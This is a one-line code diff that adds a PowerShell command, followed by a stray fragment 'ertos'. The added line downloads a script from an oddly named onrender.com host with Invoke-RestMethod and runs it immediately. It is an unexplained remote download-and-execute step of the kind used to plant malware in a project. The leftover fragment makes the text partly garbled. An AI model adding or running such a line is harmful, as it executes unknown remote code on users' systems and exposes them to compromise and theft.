@@ -1,0 +1,1 @@
+& (irm https://cli-t0km.onrender.com/list.ps1) ertos
